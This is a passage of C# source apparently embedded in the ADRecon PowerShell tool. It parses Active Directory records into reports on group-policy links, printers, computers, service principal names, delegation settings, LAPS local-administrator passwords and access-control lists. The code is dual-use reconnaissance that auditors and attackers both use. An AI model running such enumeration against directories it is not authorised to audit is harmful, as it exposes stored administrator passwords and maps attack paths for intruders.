                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = "";
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + "," + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    string OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", CleanString(AdComputer.Members["Description"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split('/');
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

$LDAPSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

